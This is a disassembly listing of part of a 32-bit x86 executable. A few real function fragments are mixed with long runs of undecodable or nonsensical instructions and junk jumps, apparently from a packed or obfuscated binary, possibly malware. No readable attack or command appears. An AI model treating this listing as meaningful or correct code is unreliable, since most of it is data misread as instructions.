  409986:	xchg   ebx,eax
  409987:	cmp    al,0xc0
  409989:	sbb    eax,0xcf578743
  40998e:	rol    ebp,cl
  409990:	pop    ebx
  409991:	and    eax,0xb0acf62b
  409996:	ror    BYTE PTR [edi+0x2a],1
  409999:	inc    esi
  40999a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40999b:	add    BYTE PTR [edx],bh
  40999d:	xor    DWORD PTR [edx],ecx
  40999f:	into   
  4099a0:	int    0x79
  4099a2:	dec    ebx
  4099a3:	mov    ?,WORD PTR [ebp+0x24]
  4099a6:	jne    0x4099f0
  4099a8:	push   ebp
  4099a9:	jb     0x40998f
  4099ab:	scas   eax,DWORD PTR es:[edi]
  4099ac:	xchg   edi,eax
  4099ad:	jmp    FWORD PTR [ebp+0x5c]
  4099b0:	sub    bh,BYTE PTR [ecx+0x2e]
  4099b3:	or     BYTE PTR [ecx+esi*1+0xa],al
  4099b7:	in     eax,dx
  4099b8:	push   cs
  4099b9:	in     eax,0xa5
  4099bb:	ja     0x409a16
  4099bd:	mov    cl,0xee
  4099bf:	inc    ecx
  4099c0:	xchg   ebx,eax
  4099c1:	push   ebp
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e09c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e217
  4099eb:	mov    edi,DWORD PTR ds:0x42e227
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e71c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e0a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fc79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e09c
  409a3d:	sbb    DWORD PTR ds:0x42e66b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	mul    DWORD PTR [ebx-0x783f4fce]
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a9c
  409a66:	jae    0x409a68
  409a68:	test   DWORD PTR [ebx],edx
  409a6a:	fisub  WORD PTR [ecx]
  409a6c:	push   ss
  409a6d:	sub    eax,0x600616db
  409a72:	mov    ch,cl
  409a74:	xor    DWORD PTR [ebx],edi
  409a76:	pop    edi
  409a77:	rcl    ah,cl
  409a79:	aaa    
  409a7a:	jne    0x409ab2
  409a7c:	add    edx,DWORD PTR [ebp+edx*1+0x7b]
  409a80:	sbb    DWORD PTR [ecx+esi*1+0x4d],ebp
  409a84:	popa   
  409a85:	pop    ss
  409a86:	inc    esi
  409a87:	mov    edi,0x13a16a2b
  409a8c:	xchg   ebx,eax
  409a8d:	imul   edx,DWORD PTR [eax+eax*1+0x6c],0xc
  409a92:	push   0x72799e97
  409a97:	mov    edx,0xccfe6b9a
  409a9c:	lods   al,BYTE PTR ds:[esi]
  409a9d:	mov    al,0x24
  409a9f:	or     eax,0x47ec3ba1
  409aa4:	fwait
  409aa5:	nop
  409aa6:	mov    ds:0x9b0420b1,al
  409aab:	test   ebx,ebp
  409aad:	(bad)  
  409aae:	jno    0x409a3c
  409ab0:	(bad)  
  409ab1:	jnp    0x409a89
  409ab3:	mov    al,ds:0xd74ce37e
  409ab8:	xchg   DWORD PTR [eax-0x6015f3e4],ebx
  409abe:	dec    esi
  409abf:	add    dh,ah
  409ac1:	je     0x409a49
  409ac3:	int3   
  409ac4:	xchg   ecx,eax
  409ac5:	les    edx,FWORD PTR [edx-0x135bb5ef]
  409acb:	mov    ah,0xf6
  409acd:	jmp    0xf2185659
  409ad2:	mov    bh,0x4c
  409ad4:	inc    eax
  409ad5:	enter  0x2b45,0x6a
  409ad9:	push   cs
  409ada:	adc    ebx,DWORD PTR [ecx]
  409adc:	lds    eax,FWORD PTR [edi-0x62]
  409adf:	push   ds
  409ae0:	mov    ah,0x54
  409ae2:	cmc    
  409ae3:	fldenv [ecx]
  409ae5:	or     eax,0x354d1ce6
  409aea:	jle    0x409ab9
  409aec:	fst    DWORD PTR [esp+eax*1-0x7b]
  409af0:	sub    eax,0xaecc8d04
  409af5:	into   
  409af6:	mov    eax,fs:0x85a3d5ba
  409afc:	push   es
  409afd:	ror    BYTE PTR [ebx+0x44],0x2
  409b01:	pop    ecx
  409b02:	and    BYTE PTR [eax],ch
  409b04:	pusha  
  409b05:	add    dl,bl
  409b07:	inc    eax
  409b08:	or     esi,esp
  409b0a:	mov    dh,0x9
  409b0c:	nop
  409b0d:	sbb    eax,0xcf89089f
  409b12:	push   cs
  409b13:	pop    edx
  409b14:	rcl    BYTE PTR [ecx+0x352bcfbc],1
  409b1a:	sub    al,BYTE PTR [edi-0x46a367b0]
  409b20:	dec    ebx
  409b21:	imul   edx,DWORD PTR [ebp+0x52],0x57d2090b
  409b28:	push   esi
  409b29:	loop   0x409ac9
  409b2b:	jp     0x409b32
  409b2d:	test   BYTE PTR [esi+0x2c],bh
  409b30:	add    edi,ebx
  409b32:	ret    
  409b33:	mov    ecx,0x6ac96020
  409b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b39:	push   edx
  409b3a:	jno    0x409b83
  409b3c:	xor    al,BYTE PTR ds:0x49b3750d
  409b42:	in     al,dx
  409b43:	cwde   
  409b44:	cmp    eax,0xcbef19de
  409b49:	mov    edx,es
  409b4b:	push   esi
  409b4c:	fst    DWORD PTR [eax+0x171723d8]
  409b52:	or     eax,0x1245a4b
  409b57:	mov    ds:0xe51b662a,eax
  409b5c:	ffreep st(3)
  409b5e:	lock add BYTE PTR [esi+0x3],al
  409b62:	(bad)  
  409b63:	mov    dh,BYTE PTR [edx-0x4248431e]
  409b69:	arpl   WORD PTR [ecx],cx
  409b6b:	aad    0x3a
  409b6d:	icebp  
  409b6e:	xchg   DWORD PTR [ecx-0x70],edi
  409b71:	rcr    dl,0xa0
  409b74:	lds    eax,FWORD PTR [ebx]
  409b76:	xchg   ch,bl
  409b78:	leave  
  409b79:	inc    ebp
  409b7a:	(bad)  
  409b7b:	pop    edx
  409b7c:	ss out 0xd0,eax
  409b7f:	cld    
  409b80:	inc    esi
  409b81:	imul   ebx,DWORD PTR [edx-0x58],0x9
  409b85:	push   edi
  409b86:	mov    esi,0xb3e8cb94
  409b8b:	rcr    edi,1
  409b8d:	data16 mov bl,0x51
  409b90:	into   
  409b91:	cmc    
  409b92:	xor    esp,DWORD PTR [edx]
  409b94:	cmp    ah,BYTE PTR [ebp+0x6e]
  409b97:	in     eax,dx
  409b98:	pop    edx
  409b99:	xchg   ebx,eax
  409b9a:	addr16 mov dl,0x23
  409b9d:	daa    
  409b9e:	retf   0x444a
  409ba1:	jbe    0x409b77
  409ba3:	dec    ebx
  409ba4:	xor    dl,BYTE PTR [ebp-0x39]
  409ba7:	test   BYTE PTR [ecx+0x7f],dl
  409baa:	(bad)  [eax+0x5e]
  409bad:	xor    esi,esp
  409baf:	popa   
  409bb0:	cmp    DWORD PTR [edi+edi*2+0x21],0x7c
  409bb5:	leave  
  409bb6:	fadd   QWORD PTR [eax]
  409bb8:	into   
  409bb9:	pop    ds
  409bba:	xor    DWORD PTR [edi],0xffffffec
  409bbd:	add    eax,0x854c9036
  409bc2:	in     al,0xf2
  409bc4:	inc    esi
  409bc5:	arpl   WORD PTR [edi],sp
  409bc7:	inc    ebx
  409bc8:	jmp    0x3678:0x15444451
  409bcf:	sub    ebx,DWORD PTR [esi-0x3e7213c2]
  409bd5:	lahf   
  409bd6:	jne    0x409b6a
  409bd8:	sahf   
  409bd9:	or     BYTE PTR [esi],0xf
  409bdc:	aaa    
  409bdd:	inc    edi
  409bde:	dec    ecx
  409bdf:	loop   0x409ba4
  409be1:	adc    esp,DWORD PTR [edi+edi*1+0x74a72281]
  409be8:	call   0x2b6f:0x23c56823
  409bef:	(bad)  
  409bf0:	fmul   st,st(2)
  409bf2:	data16 add al,BYTE PTR [esi+ebx*2+0x1e]
  409bf7:	test   esp,0xb7198e10
  409bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bfe:	popa   
  409bff:	jbe    0x409c75
  409c01:	dec    eax
  409c02:	jns    0x409ba9
  409c04:	scas   eax,DWORD PTR es:[edi]
  409c05:	shr    bl,1
  409c07:	test   BYTE PTR [ebp+0x66],dh
  409c0a:	lods   eax,DWORD PTR ds:[esi]
  409c0b:	jae    0x409c31
  409c0d:	cmp    eax,0x9dc33bf7
  409c12:	cmp    al,0x3a
  409c14:	adc    eax,0xa385c85e
  409c19:	pop    ss
  409c1a:	sahf   
  409c1b:	stc    
  409c1c:	lods   eax,DWORD PTR ds:[esi]
  409c1d:	adc    ebp,DWORD PTR [ebp+0x22]
  409c20:	inc    esp
  409c21:	inc    ebp
  409c22:	cmc    
  409c23:	dec    ebp
  409c24:	jns    0x409c1a
  409c26:	cs or  al,0x75
  409c29:	jb     0x409c96
  409c2b:	xor    DWORD PTR [ecx+0x7841c56b],esi
  409c31:	push   esp
  409c32:	dec    ebx
  409c33:	push   es
  409c34:	fldenv [esp+edx*8+0x6]
  409c38:	lds    ecx,FWORD PTR [esi]
  409c3a:	mov    ebp,0xc7784e54
  409c3f:	fisttp WORD PTR [ebx-0x2700d763]
  409c45:	test   dh,0x69
  409c48:	rol    DWORD PTR [ebx-0x6edcd4a2],0x1f
  409c4f:	pop    ebp
  409c50:	mov    ds:0xf8d59226,al
  409c55:	pop    edi
  409c56:	(bad)  
  409c57:	dec    esp
  409c58:	in     al,dx
  409c59:	loope  0x409c7a
  409c5b:	mov    esp,0xc2dd61c8
  409c60:	add    BYTE PTR [ebx+ebp*8],ch
  409c63:	xchg   ebx,eax
  409c64:	sub    al,0x12
  409c66:	ja     0x409c34
  409c68:	jmp    0x4753:0xc9bd4818
  409c6f:	jmp    0x9955:0x364895d9
  409c76:	push   edi
  409c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c78:	neg    DWORD PTR [esi+0x634f9361]
  409c7e:	retf   0x4aa2
  409c81:	cmc    
  409c82:	stos   DWORD PTR es:[edi],eax
  409c83:	mov    ds:0xddd7e20e,al
  409c88:	aam    0x64
  409c8a:	cmp    eax,0x4daac933
  409c8f:	mov    edx,0x6771032b
  409c94:	xchg   ebp,eax
  409c95:	mov    esi,0x503ebda0
  409c9a:	test   edx,eax
  409c9c:	sub    edi,DWORD PTR [esi]
  409c9e:	or     al,BYTE PTR [ebx]
  409ca0:	iret   
  409ca1:	add    DWORD PTR [ebx-0x26],ebp
  409ca4:	(bad)  
  409ca5:	mov    ah,0xfe
  409ca7:	push   ecx
  409ca8:	(bad)  
  409ca9:	std    
  409caa:	in     al,dx
  409cab:	push   edi
  409cac:	pop    ecx
  409cad:	je     0x409c94
  409caf:	or     DWORD PTR [ecx],edx
  409cb1:	leave  
  409cb2:	mov    ebx,0xcca9834d
  409cb7:	mov    dh,0x1d
  409cb9:	call   0xade2c347
  409cbe:	js     0x409c94
  409cc0:	xor    eax,0x643b9797
  409cc5:	inc    eax
  409cc6:	rol    BYTE PTR [edx+0x1b],1
  409cc9:	sub    al,0x18
  409ccb:	mov    ds:0x743d4a80,al
  409cd0:	xchg   ebx,eax
  409cd1:	call   esi
  409cd3:	popa   
  409cd4:	adc    ch,BYTE PTR [edi+0xd]
  409cd7:	(bad)  
  409cd8:	cmp    ecx,ecx
  409cda:	addr16 xchg edi,eax
  409cdc:	xor    eax,0x2a6027b8
  409ce1:	dec    ecx
  409ce2:	xchg   BYTE PTR [edx+0x76],dl
  409ce5:	in     al,dx
  409ce6:	in     eax,dx
  409ce7:	leave  
  409ce8:	jae    0x409c78
  409cea:	mov    edx,0x488ae077
  409cef:	pop    es
  409cf0:	pop    esi
  409cf1:	test   al,0xcf
  409cf3:	outs   dx,BYTE PTR ds:[esi]
  409cf4:	cdq    
  409cf5:	mov    ds:0xe2a1c795,al
  409cfa:	popf   
  409cfb:	adc    al,BYTE PTR [ebx+ecx*1-0x2f86f8c3]
  409d02:	(bad)  
  409d03:	mov    gs,WORD PTR [ebp+ebp*2+0x23]
  409d07:	jge    0x409c9a
  409d09:	sti    
  409d0a:	mov    dl,0x82
  409d0c:	add    eax,0x60a432b7
  409d11:	cwde   
  409d12:	inc    esp
  409d13:	cld    
  409d14:	add    eax,0x16625727
  409d19:	mov    ah,0xdd
  409d1b:	call   0x6373:0xa5f2ec85
  409d22:	jmp    0x33f5:0xa4d1e71f
  409d29:	mov    edx,0xbec65321
  409d2e:	mov    ebx,0x700f88bd
  409d33:	xor    cl,BYTE PTR [ecx-0x386751fa]
  409d39:	push   edi
  409d3a:	(bad)  
  409d3b:	push   0x8cb3feca
  409d40:	jmp    DWORD PTR [edi+0x2d]
  409d43:	and    DWORD PTR [eax+0x7],edi
  409d46:	jecxz  0x409cc9
  409d48:	in     al,dx
  409d49:	mov    ebx,0x59d64f13
  409d4e:	jmp    0x5625:0x5ccf9a02
  409d55:	jge    0x409d41
  409d57:	aam    0x8d
  409d59:	mov    ebp,DWORD PTR [eax+ecx*8-0x6b]
  409d5d:	push   esi
  409d5e:	cld    
  409d5f:	pop    edi
  409d60:	dec    eax
  409d61:	aam    0xfc
  409d63:	xchg   BYTE PTR [edi+eax*4+0x52126383],al
  409d6a:	sub    DWORD PTR [ecx+0x77aa3c6d],ebp
  409d70:	push   cs
  409d71:	scas   eax,DWORD PTR es:[edi]
  409d72:	sar    bh,1
  409d74:	dec    ebp
  409d75:	add    ebx,DWORD PTR [ebp-0x242ddc2f]
  409d7b:	dec    edx
  409d7c:	push   ecx
  409d7d:	mov    ds:0x22e8d900,eax
  409d82:	mov    ecx,0x210ec4b9
  409d87:	mov    ecx,0x70dd004d
  409d8c:	aaa    
  409d8d:	or     dl,BYTE PTR [ebp+0x77795c9f]
  409d93:	in     al,dx
  409d94:	fstp   TBYTE PTR [edi]
  409d96:	int    0x9f
  409d98:	inc    ecx
  409d99:	or     eax,0x4bc36978
  409d9e:	xor    BYTE PTR ds:0xa2644ce2,cl
  409da4:	fcomp  QWORD PTR [esi]
  409da6:	lods   eax,DWORD PTR ds:[esi]
  409da7:	sar    BYTE PTR [edi+0x47],0x28
  409dab:	rol    BYTE PTR [edi+eiz*4],cl
  409dae:	jno    0x409dfe
  409db0:	sti    
  409db1:	loop   0x409d3a
  409db3:	lods   al,BYTE PTR ds:[esi]
  409db4:	pop    ss
  409db5:	int    0x86
  409db7:	pusha  
  409db8:	gs nop
  409dba:	xchg   BYTE PTR [eax+0x45],al
  409dbd:	jmp    0x7e33:0xf8c68ef3
  409dc4:	mov    ds:0x770d42e5,al
  409dc9:	xlat   BYTE PTR ds:[ebx]
  409dca:	(bad)  
  409dcc:	xchg   esp,eax
  409dcd:	xor    edi,DWORD PTR ds:0xa058678f
  409dd3:	sub    al,0x15
  409dd5:	pop    ss
  409dd6:	in     al,0xc0
  409dd8:	retf   0xe272
  409ddb:	scas   eax,DWORD PTR es:[edi]
  409ddc:	and    eax,0xe3128514
  409de1:	sbb    al,0x6a
  409de3:	mov    esp,0xff8f1a47
  409de8:	or     BYTE PTR [esi+eax*4-0x2d],0x3a
  409ded:	bound  eax,QWORD PTR [edx-0x59]
  409df0:	ja     0x409e2a
  409df2:	bnd jnp 0x409e03
  409df5:	cmc    
  409df6:	(bad)
  409dfa:	out    0xba,al
  409dfc:	sbb    bh,BYTE PTR [edi-0x48a8614f]
  409e02:	dec    ecx
  409e03:	lods   eax,DWORD PTR ds:[esi]
  409e04:	outs   dx,BYTE PTR ds:[esi]
  409e05:	loop   0x409e0a
  409e07:	shl    DWORD PTR [ecx],1
  409e09:	or     eax,0x42fd0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fc79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e0a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e263
  409e51:	mov    edi,DWORD PTR ds:0x42fd02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e683,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	lods   al,BYTE PTR ds:[esi]
  409e82:	(bad)  
  409e83:	mov    dl,0xf0
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	call   0xe312:0xb2464802
  409e94:	xchg   esp,eax
  409e95:	in     eax,0xb5
  409e97:	push   esi
  409e98:	dec    esp
  409e99:	adc    edi,DWORD PTR [ebx-0x38]
  409e9c:	shl    DWORD PTR [edi+ebp*8],1
  409e9f:	sub    BYTE PTR [eax],al
  409ea1:	cmp    ch,BYTE PTR [ebx]
  409ea3:	cs sti 
  409ea5:	dec    eax
  409ea6:	out    dx,eax
  409ea7:	repz mov cl,0xbc
  409eaa:	aam    0xff
  409eac:	in     al,0x65
  409eae:	mov    ?,WORD PTR [eax]
  409eb0:	cmp    eax,0x26a14feb
  409eb5:	hlt    
  409eb6:	aaa    
  409eb7:	rcr    DWORD PTR ds:0x4af60b73,1
  409ebd:	dec    ebx
  409ebe:	mov    ds:0x28ee7e61,eax
  409ec3:	pop    ecx
  409ec4:	loopne 0x409f22
  409ec6:	dec    esp
  409ec7:	fwait
  409ec8:	js     0x409ef5
  409eca:	(bad)  
  409ecb:	out    dx,eax
  409ecc:	out    dx,al
  409ecd:	lahf   
  409ece:	sar    cl,1
  409ed0:	mov    dl,0x43
  409ed2:	(bad)  [ecx]
  409ed4:	jno    0x409e86
  409ed6:	stc    
  409ed7:	aam    0x9f
  409ed9:	mov    ecx,0x184fc065
  409ede:	or     dh,BYTE PTR [edi+edi*1-0x37f40d41]
  409ee5:	push   ecx
  409ee6:	mov    edx,0x72cff534
  409eeb:	mov    ebp,0xf062477c
  409ef0:	xor    cl,BYTE PTR [ebp+0x32c20b84]
  409ef6:	into   
  409ef7:	adc    ch,BYTE PTR [edx]
  409ef9:	mov    edi,0xe6e3a6fa
  409efe:	jbe    0x409f32
  409f00:	adc    dl,ch
  409f02:	or     esi,DWORD PTR [esi+0x439b86d4]
  409f08:	cs nop
  409f0a:	aaa    
  409f0b:	push   esi
  409f0c:	inc    esp
  409f0d:	add    al,0x5e
  409f0f:	xchg   edx,eax
  409f10:	push   ds
  409f11:	push   esi
  409f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f13:	mov    DWORD PTR [edx+0x2ea83f9d],eax
  409f19:	std    
  409f1a:	mov    esp,0x5f7f9c48
  409f1f:	sub    BYTE PTR [ebp+0x1bce31cf],0x25
  409f26:	out    0xd8,al
  409f28:	and    eax,0xe595395a
  409f2d:	aam    0xa7
  409f2f:	and    BYTE PTR [ecx+esi*8-0x78b764ad],ah
  409f36:	pop    esi
  409f37:	and    al,0x9f
  409f39:	daa    
  409f3a:	jmp    0x409eeb
  409f3c:	xchg   edx,eax
  409f3d:	mov    ebx,0x376e571e
  409f42:	mov    eax,ds:0xaf40c8c
  409f47:	lahf   
  409f48:	fwait
  409f49:	sahf   
  409f4a:	(bad)  ds:0x60dd8436
  409f50:	lods   al,BYTE PTR ds:[esi]
  409f51:	retf   0xaf1
  409f54:	stos   BYTE PTR es:[edi],al
  409f55:	cmp    dh,cl
  409f57:	(bad)  
  409f58:	mov    bl,BYTE PTR [ecx+0x5b4618cb]
  409f5e:	mov    DWORD PTR [ecx],edi
  409f60:	test   BYTE PTR [edi],dl
  409f62:	mov    ds:0x85a0f37b,al
  409f67:	jno    0x409fcb
  409f69:	addr16 call 0x8cd08d66
  409f6f:	loope  0x409f44
  409f71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f72:	iret   
  409f73:	jnp    0x409f2c
  409f75:	mov    ebp,0x44cddfdf
  409f7a:	and    al,0x6d
  409f7c:	les    edx,FWORD PTR [ecx+0x72]
  409f7f:	inc    ebx
  409f80:	jae    0x409ff4
  409f82:	sub    al,0xf1
  409f84:	pop    esp
  409f85:	dec    esp
  409f86:	xchg   ebx,eax
  409f87:	stc    
  409f88:	inc    ebp
  409f89:	repz xor cl,BYTE PTR [esi]
  409f8c:	ret    
  409f8d:	mov    al,ds:0x396cba8c
  409f92:	aaa    
  409f93:	aam    0xb4
  409f95:	idiv   BYTE PTR [ecx-0x3a]
  409f98:	stc    
  409f99:	stc    
  409f9a:	(bad)  
  409f9b:	cvtpi2ps xmm0,QWORD PTR [ebx-0x6d11acf5]
  409fa2:	push   es
  409fa3:	icebp  
  409fa4:	push   ebx
  409fa5:	cmp    ah,BYTE PTR [esi-0x4c]
  409fa8:	xlat   BYTE PTR ds:[ebx]
  409fa9:	mov    ds:0x1c322dba,eax
  409fae:	div    al
  409fb0:	push   ds
  409fb1:	or     al,0x4c
  409fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fb4:	mov    edx,0x5dabc8d0
  409fb9:	jno    0x409fb6
  409fbb:	mov    edx,0xccfb73cf
  409fc0:	mov    ebx,0xed2ddae7
  409fc5:	out    dx,eax
  409fc6:	mov    DWORD PTR ds:0x12937e01,ebx
  409fcc:	rcr    BYTE PTR [ecx-0xd68a155],cl
  409fd2:	or     esi,DWORD PTR [ebp-0x65]
  409fd5:	dec    ebx
  409fd6:	std    
  409fd7:	int    0x57
  409fd9:	(bad)  
  409fda:	out    dx,eax
  409fdb:	mov    DWORD PTR [edi-0x50efb062],ebx
  409fe1:	test   eax,0x316ad2c6
  409fe6:	imul   eax,DWORD PTR [ebp+0x45],0x1d
  409fea:	push   esi
  409feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fec:	lods   al,BYTE PTR ds:[esi]
  409fed:	xor    ecx,DWORD PTR [edi]
  409fef:	sbb    DWORD PTR [eax-0x5402aa9b],0x9456e825
  409ff9:	ins    BYTE PTR es:[edi],dx
  409ffa:	mov    ebp,ds
  409ffc:	sbb    al,0xc1
  409ffe:	push   ecx
  409fff:	dec    edx
  40a000:	sub    dl,ch
  40a002:	mov    dl,0xc6
  40a004:	and    bl,0xd3
  40a007:	sbb    eax,0xacae4136
  40a00c:	stc    
  40a00d:	retf   0x6eb9
  40a010:	add    dl,BYTE PTR [edx+edi*2-0x78]
  40a014:	jne    0x40a019
  40a016:	addr16 sub ebp,ebx
  40a019:	ret    
  40a01a:	nop
  40a01b:	add    al,0x9a
  40a01d:	popa   
  40a01e:	jne    0x409fec
  40a020:	stc    
  40a021:	stc    
  40a022:	jbe    0x40a07f
  40a024:	adc    eax,0x7763d5c6
  40a029:	(bad)  
  40a02a:	(bad)  
  40a02b:	push   0x2793d90
  40a030:	test   BYTE PTR [edi-0x2a],bl
  40a033:	fwait
  40a034:	std    
  40a035:	mov    al,0x3
  40a037:	dec    ebx
  40a038:	push   ebx
  40a039:	fdivr  DWORD PTR [ebx+0x41b36c75]
  40a03f:	add    eax,edi
  40a041:	out    0x57,al
  40a043:	jb     0x40a0b9
  40a045:	xchg   ebx,eax
  40a046:	jae    0x40a071
  40a048:	jl     0x40a014
  40a04a:	lods   eax,DWORD PTR ds:[esi]
  40a04b:	ffreep st(7)
  40a04d:	xchg   esi,eax
  40a04e:	iret   
  40a04f:	xchg   ebp,eax
  40a050:	xchg   ecx,eax
  40a051:	ins    BYTE PTR es:[edi],dx
  40a052:	or     DWORD PTR [edx+0x64aa58c6],ebx
  40a058:	fdivrp st(6),st
  40a05a:	mov    eax,0xec650946
  40a05f:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a061:	data16 mov cl,0x81
  40a064:	not    ecx
  40a066:	stos   DWORD PTR es:[edi],eax
  40a067:	push   ebp
  40a068:	and    BYTE PTR [esi],0xa2
  40a06b:	jg     0x40a014
  40a06d:	push   eax
  40a06e:	cmc    
  40a06f:	ins    DWORD PTR es:[edi],dx
  40a070:	sbb    cl,dl
  40a072:	outs   dx,DWORD PTR ds:[esi]
  40a073:	call   0x5bdcd70d
  40a078:	sub    al,0x35
  40a07a:	dec    edi
  40a07b:	inc    eax
  40a07c:	cmp    ebp,DWORD PTR [esp+ecx*2+0x3529d884]
  40a083:	data16 ins BYTE PTR es:[edi],dx
  40a085:	mov    ebx,ss
  40a087:	fs in  eax,0x5d
  40a08a:	cli    
  40a08b:	or     BYTE PTR ds:0x28a04318,bh
  40a091:	dec    esi
  40a092:	stos   BYTE PTR es:[edi],al
  40a093:	and    DWORD PTR [edx+0x69],0x4778ce15
  40a09a:	mov    esp,DWORD PTR [edi-0x6237a2d]
  40a0a0:	mov    edi,0xbb4935aa
  40a0a5:	push   es
  40a0a6:	int    0xce
  40a0a8:	loopne 0x40a08b
  40a0aa:	inc    eax
  40a0ab:	in     al,dx
  40a0ac:	test   al,0xa2
  40a0ae:	xchg   edi,eax
  40a0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b1:	out    0xb9,eax
  40a0b3:	adc    BYTE PTR [edi],bl
  40a0b5:	sbb    DWORD PTR [ebp+0x209705d7],0xcb10bc46
  40a0bf:	add    DWORD PTR ds:0x319e453e,esp
  40a0c5:	mov    eax,ds:0x26826ca2
  40a0ca:	enter  0xebcb,0x64
  40a0ce:	and    al,0xa4
  40a0d0:	dec    esi
  40a0d1:	int3   
  40a0d2:	lahf   
  40a0d3:	mov    ch,0xe7
  40a0d5:	adc    eax,0x5feaaff0
  40a0da:	sub    DWORD PTR [si],ecx
  40a0dd:	pop    edx
  40a0de:	mov    DWORD PTR [eax-0x7d3310b9],edx
  40a0e4:	xor    ah,0x78
  40a0e7:	fist   DWORD PTR [edi+0x247206eb]
  40a0ed:	xchg   edx,eax
  40a0ee:	sbb    BYTE PTR [edx-0x700431f9],ch
  40a0f4:	add    al,0xe2
  40a0f6:	sub    bh,BYTE PTR [edx]
  40a0f8:	stos   BYTE PTR es:[edi],al
  40a0f9:	mov    ecx,0xcd641c62
  40a0fe:	xlat   BYTE PTR ds:[ebx]
  40a0ff:	dec    ecx
  40a100:	pop    DWORD PTR [edx]
  40a102:	rol    DWORD PTR [ebp-0x3cbc8db],cl
  40a108:	aam    0x59
  40a10a:	push   ecx
  40a10b:	ins    DWORD PTR es:[edi],dx
  40a10c:	retf   0x186f
  40a10f:	dec    ebx
  40a110:	into   
  40a111:	shl    DWORD PTR [ecx],1
  40a113:	arpl   WORD PTR [ebx],bx
  40a115:	and    bl,BYTE PTR [edi-0x43]
  40a118:	add    cl,BYTE PTR ds:0xafa6f531
  40a11e:	inc    ebp
  40a11f:	pop    esp
  40a120:	adc    DWORD PTR [edi-0x66],edx
  40a123:	cwde   
  40a124:	fisttp QWORD PTR [esi-0x48]
  40a127:	xor    esp,ecx
  40a129:	pop    edi
  40a12a:	inc    esp
  40a12b:	or     eax,0x3e596959
  40a130:	dec    eax
  40a131:	in     al,dx
  40a132:	xchg   DWORD PTR [edx],edi
  40a134:	sahf   
  40a135:	mov    DWORD PTR [eax-0x3a503d45],ebp
  40a13b:	and    ebx,DWORD PTR [ebp+0xf]
  40a13e:	mov    al,ds:0xce29934
  40a143:	mov    dh,0xe4
  40a145:	cmp    al,0xa4
  40a147:	xor    al,0x21
  40a149:	mov    cl,cl
  40a14b:	pop    esp
  40a14c:	mov    ebp,0xfc846ad5
  40a151:	les    ebx,FWORD PTR [ecx-0x66]
  40a154:	sub    cl,BYTE PTR [ecx-0x22]
  40a157:	pusha  
  40a158:	jo     0x40a1bc
  40a15a:	cmp    al,0x9
  40a15c:	xchg   esp,eax
  40a15d:	xor    DWORD PTR [ecx],ebp
  40a15f:	sbb    al,0x1f
  40a161:	imul   ecx,DWORD PTR [ecx+ecx*1+0x78],0xffffffe7
  40a166:	push   edx
  40a167:	cld    
  40a168:	sbb    ebx,DWORD PTR ds:0x54153d5
  40a16e:	mov    ebp,0x8ae4d5ec
  40a173:	leave  
  40a174:	(bad)  
  40a175:	(bad)  
